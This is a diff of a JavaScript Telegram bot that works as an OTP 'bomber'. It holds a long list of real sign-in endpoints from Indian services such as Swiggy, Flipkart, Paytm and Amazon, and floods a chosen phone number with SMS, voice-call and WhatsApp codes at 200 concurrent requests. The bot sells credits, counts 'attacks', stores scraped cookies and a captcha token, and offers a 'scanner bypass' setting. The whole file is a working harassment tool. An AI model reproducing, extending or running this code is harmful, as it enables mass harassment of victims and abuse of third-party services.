@@ -14,8 +14,9 @@ const userStates = new Map();
 const pendingPayments = new Map();
 const adminStates = new Map();
 
-// ================= COMPLETE APIS (MERGED) =================
+// ---------- FULL API CONFIGURATION ----------
 const API_CONFIGS = [
+    // ===== SMS APIs =====
     {
       "name": "Hotstar_1",
       "method": "PUT",
@@ -459,7 +460,7 @@ const API_CONFIGS = [
         "cookie": "_gcl_dc=GCL.1600794527.CjwKCAjwwab7BRBAEiwAapqpTE-qUv3xAL_Y1Rs3cYtcuY-Jd04tW69qYrb2EEESdVOTJ-50d9_fNRoCqNcQAvD_BwE; _gcl_aw=GCL.1600794527.CjwKCAjwwab7BRBAEiwAapqpTE-qUv3xAL_Y1Rs3cYtcuY-Jd04tW69qYrb2EEESdVOTJ-50d9_fNRoCqNcQAvD_BwE; moe_uuid=6a221a22-79b0-4a05-87a6-bb6ccc786f4e; WZRK_S_8WR-895-K74Z=%7B%22p%22%3A1%2C%22s%22%3A1600794521%2C%22t%22%3A1600794520%7D; km_lv=1600794517; kvcd=1600794517298; _gac_UA-52838179-3=1.1600792907.CjwKCAjwwab7BRBAEiwAapqpTE-qUv3xAL_Y1Rs3cYtcuY-Jd04tW69qYrb2EEESdVOTJ-50d9_fNRoCqNcQAvD_BwE; _gid=GA1.2.1580594851.1600792840; _ga=GA1.2.999929697.1600792840; USER_DATA=%7B%22attributes%22%3A%5B%5D%2C%22subscribedToOldSdk%22%3Afalse%2C%22deviceUuid%22%3A%226a221a22-79b0-4a05-87a6-bb6ccc786f4e%22%2C%22deviceAdded%22%3Atrue%7D; _fbp=fb.1.1600792808706.1882458684; _gcl_au=1.1.1765065041.1600792806; WZRK_G=9d0490f3acc94a80a8feafc7aaa146b0; km_vs=1; km_ai=qEioHmXYYtngAVbnv7c6PZcDSIM%3D"
       },
       "data": {
-        "email": None,
+        "email": null,
         "phoneCode": "+91",
         "phoneNumber": "{phone}",
         "ver": "11.345"
@@ -492,8 +493,8 @@ const API_CONFIGS = [
         "country_code": "IN",
         "otp_type": 1,
         "email": "",
-        "send_otp": True,
-        "is_un_teach_user": False
+        "send_otp": true,
+        "is_un_teach_user": false
       },
       "phone_format": "raw"
     },
@@ -733,7 +734,7 @@ const API_CONFIGS = [
         "state": "",
         "responseType": "code",
         "theme": "mp-html5",
-        "dob_agreement": True
+        "dob_agreement": true
       },
       "phone_format": "raw"
     },
@@ -1507,7 +1508,7 @@ const API_CONFIGS = [
         "dialingCode": "+91",
         "countryCode": "IN",
         "headers": {},
-        "verificationId": None,
+        "verificationId": null,
         "captchaInfo": {
           "gcaptcha": "03AGdBq26mRWBEeBGcFIqhyewjUTfv-Cl4msB5OR3-1NN-IS9kKj3JDAR6MxB0rvNMfhCRqxJccxbUSndGyJvojv2ohDgNe2q8683oSNoD624E20bLqeo6ViMHsgogMvgSmKQUlummiZfr3MUM39UW0T8yJkG1OAEO9-HWTK-wZkEG7bgpxoGFrh1Cw4WwIGPnVZ4-pmulwlAbDCqsgqahK9ngTb8S-EPZu7tFR1srJDE8nF4WhHUR8qsLR1ijem1sNsrdi2-_IihHp3GZqisH1Izt-dmuGW-zSYWyHmZ5EtNcZEk4iA0rxlPpru-n0fxN8RjAH7z4dJJ3vhish9hcyhYYSriKYmiFZzrwO1T72BQrXyx8Xk_zf6YnHwzZms-NEdojlOt87D-t45Fm31IXnTBcTM1-TXZmKCoia6k1kGZmk1arWUMNuSq0SNMh6g42XZ59_I14q_qhM9qF7lMNaSbYOaRQnjlLkA",
           "fingerPrint": 3664542227,
@@ -1882,13 +1883,17 @@ const API_CONFIGS = [
         "_raw": "id=6778500660&name=TsunamiBomber&mobile={phone}&email=hacker%40gmail.com&address=faizabad&pin=224001&submit=Register"
       },
       "phone_format": "raw"
-    },
+    }
+];
+
+// ===== VOICE CALL APIS (CONVERTED FROM PYTHON LAMBDAS) =====
+const VOICE_APIS = [
     {
       "name": "Tata Capital Voice Call",
       "url": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice",
       "method": "POST",
       "headers": {"Content-Type": "application/json"},
-      "data": lambda phone: f'{{"phone":"{phone}","isOtpViaCallAtLogin":"true"}}',
+      "data": (phone) => JSON.stringify({ phone, isOtpViaCallAtLogin: "true" }),
       "phone_format": "raw"
     },
     {
@@ -1896,7 +1901,7 @@ const API_CONFIGS = [
       "url": "https://www.1mg.com/auth_api/v6/create_token",
       "method": "POST",
       "headers": {"Content-Type": "application/json; charset=utf-8"},
-      "data": lambda phone: f'{{"number":"{phone}","otp_on_call":true}}',
+      "data": (phone) => JSON.stringify({ number: phone, otp_on_call: true }),
       "phone_format": "raw"
     },
     {
@@ -1904,7 +1909,7 @@ const API_CONFIGS = [
       "url": "https://profile.swiggy.com/api/v3/app/request_call_verification",
       "method": "POST",
       "headers": {"Content-Type": "application/json"},
-      "data": lambda phone: f'{{"mobile":"{phone}"}}',
+      "data": (phone) => JSON.stringify({ mobile: phone }),
       "phone_format": "raw"
     },
     {
@@ -1912,7 +1917,7 @@ const API_CONFIGS = [
       "url": "https://www.flipkart.com/api/6/user/voice-otp/generate",
       "method": "POST",
       "headers": {"Content-Type": "application/json"},
-      "data": lambda phone: f'{{"mobile":"{phone}"}}',
+      "data": (phone) => JSON.stringify({ mobile: phone }),
       "phone_format": "raw"
     },
     {
@@ -1920,7 +1925,7 @@ const API_CONFIGS = [
       "url": "https://www.amazon.in/ap/signin",
       "method": "POST",
       "headers": {"Content-Type": "application/x-www-form-urlencoded"},
-      "data": lambda phone: f"phone={phone}&action=voice_otp",
+      "data": (phone) => `phone=${phone}&action=voice_otp`,
       "phone_format": "raw"
     },
     {
@@ -1928,7 +1933,7 @@ const API_CONFIGS = [
       "url": "https://accounts.paytm.com/signin/voice-otp",
       "method": "POST",
       "headers": {"Content-Type": "application/json"},
-      "data": lambda phone: f'{{"phone":"{phone}"}}',
+      "data": (phone) => JSON.stringify({ phone: phone }),
       "phone_format": "raw"
     },
     {
@@ -1936,7 +1941,7 @@ const API_CONFIGS = [
       "url": "https://www.zomato.com/php/o2_api_handler.php",
       "method": "POST",
       "headers": {"Content-Type": "application/x-www-form-urlencoded"},
-      "data": lambda phone: f"phone={phone}&type=voice",
+      "data": (phone) => `phone=${phone}&type=voice`,
       "phone_format": "raw"
     },
     {
@@ -1944,7 +1949,7 @@ const API_CONFIGS = [
       "url": "https://www.makemytrip.com/api/4/voice-otp/generate",
       "method": "POST",
       "headers": {"Content-Type": "application/json"},
-      "data": lambda phone: f'{{"phone":"{phone}"}}',
+      "data": (phone) => JSON.stringify({ phone: phone }),
       "phone_format": "raw"
     },
     {
@@ -1952,7 +1957,7 @@ const API_CONFIGS = [
       "url": "https://api.olacabs.com/v1/voice-otp",
       "method": "POST",
       "headers": {"Content-Type": "application/json"},
-      "data": lambda phone: f'{{"phone":"{phone}"}}',
+      "data": (phone) => JSON.stringify({ phone: phone }),
       "phone_format": "raw"
     },
     {
@@ -1960,15 +1965,19 @@ const API_CONFIGS = [
       "url": "https://auth.uber.com/v2/voice-otp",
       "method": "POST",
       "headers": {"Content-Type": "application/json"},
-      "data": lambda phone: f'{{"phone":"+91{phone}"}}',
+      "data": (phone) => JSON.stringify({ phone: `+91${phone}` }),
       "phone_format": "raw"
-    },
+    }
+];
+
+// ===== WHATSAPP APIS (CONVERTED FROM PYTHON LAMBDAS) =====
+const WHATSAPP_APIS = [
     {
       "name": "KPN WhatsApp",
       "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.2.6",
       "method": "POST",
-      "headers": {"x-app-id": "66ef3594-1e51-4e15-87c5-05fc8208a20f", "content-type": "application/json; charset=UTF-8"},
-      "data": lambda phone: f'{{"notification_channel":"WHATSAPP","phone_number":{{"country_code":"+91","number":"{phone}"}}}}',
+      "headers": { "x-app-id": "66ef3594-1e51-4e15-87c5-05fc8208a20f", "content-type": "application/json; charset=UTF-8" },
+      "data": (phone) => JSON.stringify({ notification_channel: "WHATSAPP", phone_number: { country_code: "+91", number: phone } }),
       "phone_format": "raw"
     },
     {
@@ -1976,15 +1985,15 @@ const API_CONFIGS = [
       "url": "https://www.foxy.in/api/v2/users/send_otp",
       "method": "POST",
       "headers": {"Content-Type": "application/json"},
-      "data": lambda phone: f'{{"user":{{"phone_number":"+91{phone}"}},"via":"whatsapp"}}',
+      "data": (phone) => JSON.stringify({ user: { phone_number: `+91${phone}` }, via: "whatsapp" }),
       "phone_format": "raw"
     },
     {
       "name": "Jockey WhatsApp",
-      "url": lambda phone: f"https://www.jockey.in/apps/jotp/api/login/resend-otp/+91{phone}?whatsapp=true",
+      "url": (phone) => `https://www.jockey.in/apps/jotp/api/login/resend-otp/+91${phone}?whatsapp=true`,
       "method": "GET",
       "headers": {},
-      "data": None,
+      "data": null,
       "phone_format": "raw"
     },
     {
@@ -1992,15 +2001,19 @@ const API_CONFIGS = [
       "url": "https://services.mxgrability.rappi.com/api/rappi-authentication/login/whatsapp/create",
       "method": "POST",
       "headers": {"Content-Type": "application/json; charset=utf-8"},
-      "data": lambda phone: f'{{"country_code":"+91","phone":"{phone}"}}',
+      "data": (phone) => JSON.stringify({ country_code: "+91", phone: phone }),
       "phone_format": "raw"
-    },
+    }
+];
+
+// ===== ADDITIONAL SMS APIS =====
+const EXTRA_APIS = [
     {
       "name": "Lenskart SMS",
       "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp",
       "method": "POST",
       "headers": {"Content-Type": "application/json"},
-      "data": lambda phone: f'{{"phoneCode":"+91","telephone":"{phone}"}}',
+      "data": (phone) => JSON.stringify({ phoneCode: "+91", telephone: phone }),
       "phone_format": "raw"
     },
     {
@@ -2008,7 +2021,7 @@ const API_CONFIGS = [
       "url": "https://www.nobroker.in/api/v3/account/otp/send",
       "method": "POST",
       "headers": {"Content-Type": "application/x-www-form-urlencoded"},
-      "data": lambda phone: f"phone={phone}&countryCode=IN",
+      "data": (phone) => `phone=${phone}&countryCode=IN`,
       "phone_format": "raw"
     },
     {
@@ -2016,7 +2029,7 @@ const API_CONFIGS = [
       "url": "https://pharmeasy.in/api/v2/auth/send-otp",
       "method": "POST",
       "headers": {"Content-Type": "application/json"},
-      "data": lambda phone: f'{{"phone":"{phone}"}}',
+      "data": (phone) => JSON.stringify({ phone: phone }),
       "phone_format": "raw"
     },
     {
@@ -2024,7 +2037,7 @@ const API_CONFIGS = [
       "url": "https://api.wakefit.co/api/consumer-sms-otp/",
       "method": "POST",
       "headers": {"Content-Type": "application/json"},
-      "data": lambda phone: f'{{"mobile":"{phone}"}}',
+      "data": (phone) => JSON.stringify({ mobile: phone }),
       "phone_format": "raw"
     },
     {
@@ -2032,7 +2045,7 @@ const API_CONFIGS = [
       "url": "https://communication.api.hungama.com/v1/communication/otp",
       "method": "POST",
       "headers": {"Content-Type": "application/json"},
-      "data": lambda phone: f'{{"mobileNo":"{phone}","countryCode":"+91","appCode":"un","messageId":"1","device":"web"}}',
+      "data": (phone) => JSON.stringify({ mobileNo: phone, countryCode: "+91", appCode: "un", messageId: "1", device: "web" }),
       "phone_format": "raw"
     },
     {
@@ -2040,7 +2053,7 @@ const API_CONFIGS = [
       "url": "https://merucabapp.com/api/otp/generate",
       "method": "POST",
       "headers": {"Content-Type": "application/x-www-form-urlencoded"},
-      "data": lambda phone: f"mobile_number={phone}",
+      "data": (phone) => `mobile_number=${phone}`,
       "phone_format": "raw"
     },
     {
@@ -2048,7 +2061,7 @@ const API_CONFIGS = [
       "url": "https://api.snapmint.com/v1/public/sign_up",
       "method": "POST",
       "headers": {"Content-Type": "application/json"},
-      "data": lambda phone: f'{{"phone":"{phone}"}}',
+      "data": (phone) => JSON.stringify({ phone: phone }),
       "phone_format": "raw"
     },
     {
@@ -2056,7 +2069,7 @@ const API_CONFIGS = [
       "url": "https://login.housing.com/api/v2/send-otp",
       "method": "POST",
       "headers": {"Content-Type": "application/json"},
-      "data": lambda phone: f'{{"phone":"{phone}","country_url_name":"in"}}',
+      "data": (phone) => JSON.stringify({ phone: phone, country_url_name: "in" }),
       "phone_format": "raw"
     },
     {
@@ -2064,15 +2077,7 @@ const API_CONFIGS = [
       "url": "https://api.khatabook.com/v1/auth/request-otp",
       "method": "POST",
       "headers": {"Content-Type": "application/json"},
-      "data": lambda phone: f'{{"phone":"{phone}","app_signature":"wk+avHrHZf2"}}',
-      "phone_format": "raw"
-    },
-    {
-      "name": "Netmeds",
-      "url": "https://apiv2.netmeds.com/mst/rest/v1/id/details/",
-      "method": "POST",
-      "headers": {"Content-Type": "application/json"},
-      "data": lambda phone: f'{{"mobile":"{phone}"}}',
+      "data": (phone) => JSON.stringify({ phone: phone, app_signature: "wk+avHrHZf2" }),
       "phone_format": "raw"
     },
     {
@@ -2080,7 +2085,7 @@ const API_CONFIGS = [
       "url": "https://www.nykaa.com/app-api/index.php/customer/send_otp",
       "method": "POST",
       "headers": {"Content-Type": "application/x-www-form-urlencoded"},
-      "data": lambda phone: f"source=sms&app_version=3.0.9&mobile_number={phone}&platform=ANDROID&domain=nykaa",
+      "data": (phone) => `source=sms&app_version=3.0.9&mobile_number=${phone}&platform=ANDROID&domain=nykaa`,
       "phone_format": "raw"
     },
     {
@@ -2088,7 +2093,7 @@ const API_CONFIGS = [
       "url": "https://www.rummycircle.com/api/fl/auth/v3/getOtp",
       "method": "POST",
       "headers": {"Content-Type": "application/json"},
-      "data": lambda phone: f'{{"mobile":"{phone}","isPlaycircle":false}}',
+      "data": (phone) => JSON.stringify({ mobile: phone, isPlaycircle: false }),
       "phone_format": "raw"
     },
     {
@@ -2096,7 +2101,7 @@ const API_CONFIGS = [
       "url": "https://animall.in/zap/auth/login",
       "method": "POST",
       "headers": {"Content-Type": "application/json"},
-      "data": lambda phone: f'{{"phone":"{phone}","signupPlatform":"NATIVE_ANDROID"}}',
+      "data": (phone) => JSON.stringify({ phone: phone, signupPlatform: "NATIVE_ANDROID" }),
       "phone_format": "raw"
     },
     {
@@ -2104,7 +2109,7 @@ const API_CONFIGS = [
       "url": "https://prod.api.cosmofeed.com/api/user/authenticate",
       "method": "POST",
       "headers": {"Content-Type": "application/json"},
-      "data": lambda phone: f'{{"phone":"{phone}","version":"1.4.28"}}',
+      "data": (phone) => JSON.stringify({ phone: phone, version: "1.4.28" }),
       "phone_format": "raw"
     },
     {
@@ -2112,7 +2117,7 @@ const API_CONFIGS = [
       "url": "https://app.trulymadly.com/api/auth/mobile/v1/send-otp",
       "method": "POST",
       "headers": {"Content-Type": "application/json"},
-      "data": lambda phone: f'{{"mobile":"{phone}","locale":"IN"}}',
+      "data": (phone) => JSON.stringify({ mobile: phone, locale: "IN" }),
       "phone_format": "raw"
     },
     {
@@ -2120,7 +2125,7 @@ const API_CONFIGS = [
       "url": "https://customer.rapido.bike/api/otp",
       "method": "POST",
       "headers": {"Content-Type": "application/json"},
-      "data": lambda phone: f'{{"mobile":"{phone}"}}',
+      "data": (phone) => JSON.stringify({ mobile: phone }),
       "phone_format": "raw"
     },
     {
@@ -2128,7 +2133,7 @@ const API_CONFIGS = [
       "url": "https://api.countrydelight.in/api/v1/customer/requestOtp",
       "method": "POST",
       "headers": {"Content-Type": "application/json"},
-      "data": lambda phone: f'{{"mobile":"{phone}","platform":"Android","mode":"new_user"}}',
+      "data": (phone) => JSON.stringify({ mobile: phone, platform: "Android", mode: "new_user" }),
       "phone_format": "raw"
     },
     {
@@ -2136,7 +2141,7 @@ const API_CONFIGS = [
       "url": "https://www.dream11.com/auth/passwordless/init",
       "method": "POST",
       "headers": {"Content-Type": "application/json"},
-      "data": lambda phone: f'{{"channel":"sms","flow":"SIGNUP","phoneNumber":"{phone}","templateName":"default"}}',
+      "data": (phone) => JSON.stringify({ channel: "sms", flow: "SIGNUP", phoneNumber: phone, templateName: "default" }),
       "phone_format": "raw"
     },
     {
@@ -2144,7 +2149,7 @@ const API_CONFIGS = [
       "url": "https://api.spinny.com/api/c/user/otp-request/v3/",
       "method": "POST",
       "headers": {"Content-Type": "application/json"},
-      "data": lambda phone: f'{{"contact_number":"{phone}","whatsapp":false,"code_len":4,"expected_action":"login"}}',
+      "data": (phone) => JSON.stringify({ contact_number: phone, whatsapp: false, code_len: 4, expected_action: "login" }),
       "phone_format": "raw"
     },
     {
@@ -2152,7 +2157,7 @@ const API_CONFIGS = [
       "url": "https://www.licious.in/api/login/signup",
       "method": "POST",
       "headers": {"Content-Type": "application/json"},
-      "data": lambda phone: f'{{"phone":"{phone}","captcha_token":null}}',
+      "data": (phone) => JSON.stringify({ phone: phone, captcha_token: null }),
       "phone_format": "raw"
     },
     {
@@ -2160,7 +2165,7 @@ const API_CONFIGS = [
       "url": "https://auth.udaan.com/api/otp/send?client_id=udaan-v2",
       "method": "POST",
       "headers": {"Content-Type": "application/x-www-form-urlencoded;charset=UTF-8"},
-      "data": lambda phone: f"mobile={phone}",
+      "data": (phone) => `mobile=${phone}`,
       "phone_format": "raw"
     },
     {
@@ -2168,10 +2173,33 @@ const API_CONFIGS = [
       "url": "https://api.charzer.com/auth-service/send-otp",
       "method": "POST",
       "headers": {"Content-Type": "application/json"},
-      "data": lambda phone: f'{{"mobile":"{phone}","appSource":"CHARZER_APP"}}',
+      "data": (phone) => JSON.stringify({ mobile: phone, appSource: "CHARZER_APP" }),
       "phone_format": "raw"
     }
 ];
+
+// ===== MERGE ALL APIS =====
+const allApis = [...API_CONFIGS, ...VOICE_APIS, ...WHATSAPP_APIS, ...EXTRA_APIS];
+
+// Deduplicate by URL
+const seenUrls = new Set();
+const uniqueApis = [];
+for (const api of allApis) {
+    const urlKey = typeof api.url === 'function' ? `dynamic_${api.name || 'unknown'}` : api.url;
+    if (!seenUrls.has(urlKey)) {
+        seenUrls.add(urlKey);
+        uniqueApis.push(api);
+    }
+}
+
+// Ensure all APIs have required fields
+for (const api of uniqueApis) {
+    if (!api.name) api.name = `api_${uniqueApis.indexOf(api)}`;
+    if (!api.data) api.data = null;
+}
+
+console.log(`✅ Loaded ${uniqueApis.length} unique APIs`);
+
 // ---------- FALLBACK DATA GENERATOR ----------
 function makeFallbackData(phone, apiName) {
     const lower = apiName.toLowerCase();
@@ -2221,7 +2249,7 @@ async function makeApiCall(api, phone) {
 
         const headers = { ...api.headers };
         
-        // Remove problematic headers (axios auto-handles)
+        // Remove problematic headers
         delete headers['content-length'];
         delete headers['Content-Length'];
         delete headers['host'];
@@ -2234,7 +2262,6 @@ async function makeApiCall(api, phone) {
             if (typeof api.data === 'function') {
                 data = api.data(phone);
             } else if (api.data._raw) {
-                // Python style raw data (x-www-form-urlencoded)
                 let rawData = api.data._raw;
                 if (typeof rawData === 'string') {
                     rawData = rawData.replace(/{phone}/g, phone);
@@ -2243,7 +2270,6 @@ async function makeApiCall(api, phone) {
                 isRaw = true;
             } else {
                 data = JSON.parse(JSON.stringify(api.data));
-                // Deep replace {phone}
                 const replacePhone = (obj) => {
                     if (typeof obj === 'string') return obj.replace(/{phone}/g, phone);
                     if (Array.isArray(obj)) return obj.map(replacePhone);
@@ -2293,7 +2319,6 @@ async function makeApiCall(api, phone) {
 }
 
 async function runBomber(chatId, phone, durationMinutes) {
-    // Check protected numbers
     const protectedList = await db.getProtected();
     if (protectedList.includes(phone)) {
         bot.sendMessage(chatId, '⚠️ This number is PROTECTED by admin.\nBombing not allowed!');
@@ -2346,7 +2371,7 @@ async function runBomber(chatId, phone, durationMinutes) {
     const startTime = Date.now() / 1000;
     const endTime = startTime + (durationMinutes === 1440 ? 86400 : durationMinutes * 60);
     const concurrency = 200;
-    const apiList = API_CONFIGS;
+    const apiList = uniqueApis;
 
     while (bombingStatus.get(chatId)) {
         if (!isUnlimited && Date.now() / 1000 >= endTime) break;
@@ -2588,45 +2613,13 @@ bot.on('callback_query', async (callbackQuery) => {
     }
 
     // Broadcast type selection
-    if (data === 'broadcast_text') {
+    if (data === 'broadcast_text' || data === 'broadcast_photo' || data === 'broadcast_video' ||
+        data === 'broadcast_document' || data === 'broadcast_audio' || data === 'broadcast_sticker') {
         if (!ADMIN_IDS.includes(Number(chatId))) return bot.answerCallbackQuery(callbackQuery.id, { text: '⛔ Admin only' });
-        adminStates.set(chatId, { action: 'broadcast_text' });
-        bot.editMessageText('📝 Send the text message to broadcast:', { chat_id: chatId, message_id: msgId });
-        bot.answerCallbackQuery(callbackQuery.id);
-        return;
-    }
-    if (data === 'broadcast_photo') {
-        if (!ADMIN_IDS.includes(Number(chatId))) return bot.answerCallbackQuery(callbackQuery.id, { text: '⛔ Admin only' });
-        adminStates.set(chatId, { action: 'broadcast_photo' });
-        bot.editMessageText('🖼️ Send the photo with caption (optional):', { chat_id: chatId, message_id: msgId });
-        bot.answerCallbackQuery(callbackQuery.id);
-        return;
-    }
-    if (data === 'broadcast_video') {
-        if (!ADMIN_IDS.includes(Number(chatId))) return bot.answerCallbackQuery(callbackQuery.id, { text: '⛔ Admin only' });
-        adminStates.set(chatId, { action: 'broadcast_video' });
-        bot.editMessageText('🎥 Send the video with caption (optional):', { chat_id: chatId, message_id: msgId });
-        bot.answerCallbackQuery(callbackQuery.id);
-        return;
-    }
-    if (data === 'broadcast_document') {
-        if (!ADMIN_IDS.includes(Number(chatId))) return bot.answerCallbackQuery(callbackQuery.id, { text: '⛔ Admin only' });
-        adminStates.set(chatId, { action: 'broadcast_document' });
-        bot.editMessageText('📄 Send the document with caption (optional):', { chat_id: chatId, message_id: msgId });
-        bot.answerCallbackQuery(callbackQuery.id);
-        return;
-    }
-    if (data === 'broadcast_audio') {
-        if (!ADMIN_IDS.includes(Number(chatId))) return bot.answerCallbackQuery(callbackQuery.id, { text: '⛔ Admin only' });
-        adminStates.set(chatId, { action: 'broadcast_audio' });
-        bot.editMessageText('🔊 Send the audio with caption (optional):', { chat_id: chatId, message_id: msgId });
-        bot.answerCallbackQuery(callbackQuery.id);
-        return;
-    }
-    if (data === 'broadcast_sticker') {
-        if (!ADMIN_IDS.includes(Number(chatId))) return bot.answerCallbackQuery(callbackQuery.id, { text: '⛔ Admin only' });
-        adminStates.set(chatId, { action: 'broadcast_sticker' });
-        bot.editMessageText('🏷️ Send the sticker:', { chat_id: chatId, message_id: msgId });
+        const type = data.replace('broadcast_', '');
+        adminStates.set(chatId, { action: data });
+        const typeNames = { text: '📝 text message', photo: '🖼️ photo', video: '🎥 video', document: '📄 document', audio: '🔊 audio', sticker: '🏷️ sticker' };
+        bot.editMessageText(`📢 Send the ${typeNames[type] || type} to broadcast:`, { chat_id: chatId, message_id: msgId });
         bot.answerCallbackQuery(callbackQuery.id);
         return;
     }
@@ -2705,6 +2698,56 @@ bot.on('callback_query', async (callbackQuery) => {
     if (data === 'admin_back') {
         bot.editMessageText('🔐 Admin Panel', { chat_id: chatId, message_id: msgId });
         bot.sendMessage(chatId, '🔐 Admin Panel', adminKeyboard());
+        bot.answerCallbackQuery(callbackQuery.id);
+        return;
+    }
+
+    // Settings callbacks
+    if (data === 'settings_view') {
+        const user = await db.getUser(chatId);
+        const msg = `📋 **Your Current Settings**\n\n🔍 Scanner: ${user.scanner_enabled ? '✅ Enabled' : '❌ Disabled'}\n🛡️ Custom Headers: ${Object.keys(user.custom_headers || {}).length} modified\n\n${Object.keys(user.custom_headers || {}).length > 0 ? '**Custom Headers:**\n' + Object.entries(user.custom_headers).map(([k, v]) => `\`${k}\`: \`${v}\``).join('\n') : 'No custom headers set.'}`;
+        bot.editMessageText(msg, { chat_id: chatId, message_id: msgId, parse_mode: 'Markdown' });
+        bot.answerCallbackQuery(callbackQuery.id);
+        return;
+    }
+    if (data === 'settings_add_scanner') {
+        bot.editMessageText('🔍 **Scanner/Bypass Setup**\n\nPlease send a description or code for scanner bypass.', 
+            { chat_id: chatId, message_id: msgId });
+        userStates.set(chatId, { state: 'add_scanner_user' });
+        bot.answerCallbackQuery(callbackQuery.id);
+        return;
+    }
+    if (data === 'settings_modify_headers') {
+        bot.editMessageText('📝 **Modify Headers**\n\nSend header modifications in format:\n`header_name: header_value`\n\nSend /done when finished.', 
+            { chat_id: chatId, message_id: msgId });
+        userStates.set(chatId, { state: 'modify_headers', headers: {} });
+        bot.answerCallbackQuery(callbackQuery.id);
+        return;
+    }
+
+    // All users pagination
+    if (data.startsWith('allusers_')) {
+        const page = parseInt(data.split('_')[1]);
+        const state = userStates.get(chatId);
+        if (state && state.state === 'allusers') {
+            const start = page * state.perPage;
+            const end = start + state.perPage;
+            const chunk = state.users.slice(start, end);
+            let msg = '👥 **ALL USERS**\n\n';
+            chunk.forEach(u => {
+                msg += `🆔 \`${u._id}\` | @${u.username || 'no_username'} | 💰${u.credits}\n`;
+            });
+            msg += `\nPage ${page+1}/${state.totalPages}`;
+            const markup = {
+                inline_keyboard: [
+                    ...(page > 0 ? [{ text: '◀️ Prev', callback_data: `allusers_${page-1}` }] : []),
+                    ...(page < state.totalPages-1 ? [{ text: 'Next ▶️', callback_data: `allusers_${page+1}` }] : [])
+                ]
+            };
+            bot.editMessageText(msg, { chat_id: chatId, message_id: msgId, parse_mode: 'Markdown', reply_markup: markup });
+            state.page = page;
+            userStates.set(chatId, state);
+        }
         bot.answerCallbackQuery(callbackQuery.id);
         return;
     }
@@ -2792,7 +2835,7 @@ bot.on('message', async (msg) => {
             const config = await db.getScannerConfig();
             const channels = await db.getChannels();
             bot.sendMessage(chatId, 
-                `📊 **BOT STATS**\n👥 Users: ${totalUsers}\n💰 Total credits: ${totalCredits}\n⚔️ Attacks: ${totalAttacks}\n📡 APIs loaded: ${API_CONFIGS.length}\n📺 Channels: ${channels.length}\n🛡️ Scanners: ${config.scanners.length}`,
+                `📊 **BOT STATS**\n👥 Users: ${totalUsers}\n💰 Total credits: ${totalCredits}\n⚔️ Attacks: ${totalAttacks}\n📡 APIs loaded: ${uniqueApis.length}\n📺 Channels: ${channels.length}\n🛡️ Scanners: ${config.scanners.length}`,
                 { parse_mode: 'Markdown' }
             );
             return;
@@ -2878,7 +2921,6 @@ bot.on('message', async (msg) => {
                 return bot.sendMessage(chatId, msg, { parse_mode: 'Markdown', reply_markup: markup });
             };
             await sendPage(0);
-            // Store for pagination
             userStates.set(chatId, { state: 'allusers', users, page: 0, perPage, totalPages });
             return;
         }
@@ -3047,16 +3089,18 @@ bot.on('message', async (msg) => {
 
         // Channel management states
         if (state.state === 'add_channel') {
-            if (!input.startsWith('@')) input = '@' + input;
-            await db.addChannel(input);
-            bot.sendMessage(chatId, `✅ Channel ${input} added successfully!`);
+            let channel = input;
+            if (!channel.startsWith('@')) channel = '@' + channel;
+            await db.addChannel(channel);
+            bot.sendMessage(chatId, `✅ Channel ${channel} added successfully!`);
             userStates.delete(chatId);
             return;
         }
         if (state.state === 'remove_channel') {
-            if (!input.startsWith('@')) input = '@' + input;
-            await db.removeChannel(input);
-            bot.sendMessage(chatId, `✅ Channel ${input} removed successfully!`);
+            let channel = input;
+            if (!channel.startsWith('@')) channel = '@' + channel;
+            await db.removeChannel(channel);
+            bot.sendMessage(chatId, `✅ Channel ${channel} removed successfully!`);
             userStates.delete(chatId);
             return;
         }
@@ -3084,6 +3128,37 @@ bot.on('message', async (msg) => {
                 bot.sendMessage(chatId, '❌ Invalid JSON format.');
             }
             userStates.delete(chatId);
+            return;
+        }
+        if (state.state === 'add_scanner_user') {
+            const user = await db.getUser(chatId);
+            user.scanner_enabled = true;
+            user.scanner_data = input;
+            await user.save();
+            bot.sendMessage(chatId, '✅ Scanner bypass configured successfully!');
+            userStates.delete(chatId);
+            return;
+        }
+        if (state.state === 'modify_headers') {
+            if (input === '/done') {
+                const user = await db.getUser(chatId);
+                user.custom_headers = state.headers || {};
+                await user.save();
+                bot.sendMessage(chatId, `✅ Headers saved! ${Object.keys(state.headers || {}).length} headers modified.`);
+                userStates.delete(chatId);
+                return;
+            }
+            if (input.includes(':')) {
+                const parts = input.split(':', 1);
+                const headerName = parts[0].trim();
+                const headerValue = input.substring(parts[0].length + 1).trim();
+                if (!state.headers) state.headers = {};
+                state.headers[headerName] = headerValue;
+                userStates.set(chatId, state);
+                bot.sendMessage(chatId, `✅ Header added: \`${headerName}\`: \`${headerValue}\`\nSend more or /done`);
+            } else {
+                bot.sendMessage(chatId, '❌ Invalid format. Use `header_name: header_value`');
+            }
             return;
         }
 
@@ -3302,67 +3377,11 @@ bot.on('message', async (msg) => {
     }
 });
 
-// ---------- SETTINGS CALLBACK ----------
-bot.on('callback_query', async (callbackQuery) => {
-    const chatId = callbackQuery.message.chat.id;
-    const data = callbackQuery.data;
-
-    if (data === 'settings_view') {
-        const user = await db.getUser(chatId);
-        const msg = `📋 **Your Current Settings**\n\n🔍 Scanner: ${user.scanner_enabled ? '✅ Enabled' : '❌ Disabled'}\n🛡️ Custom Headers: ${Object.keys(user.custom_headers || {}).length} modified\n\n${Object.keys(user.custom_headers || {}).length > 0 ? '**Custom Headers:**\n' + Object.entries(user.custom_headers).map(([k, v]) => `\`${k}\`: \`${v}\``).join('\n') : 'No custom headers set.'}`;
-        bot.editMessageText(msg, { chat_id: chatId, message_id: callbackQuery.message.message_id, parse_mode: 'Markdown' });
-        bot.answerCallbackQuery(callbackQuery.id);
-        return;
-    }
-
-    if (data === 'settings_add_scanner') {
-        bot.editMessageText('🔍 **Scanner/Bypass Setup**\n\nPlease send a description or code for scanner bypass.', 
-            { chat_id: chatId, message_id: callbackQuery.message.message_id });
-        userStates.set(chatId, { state: 'add_scanner_user' });
-        bot.answerCallbackQuery(callbackQuery.id);
-        return;
-    }
-
-    if (data === 'settings_modify_headers') {
-        bot.editMessageText('📝 **Modify Headers**\n\nSend header modifications in format:\n`header_name: header_value`\n\nSend /done when finished.', 
-            { chat_id: chatId, message_id: callbackQuery.message.message_id });
-        userStates.set(chatId, { state: 'modify_headers', headers: {} });
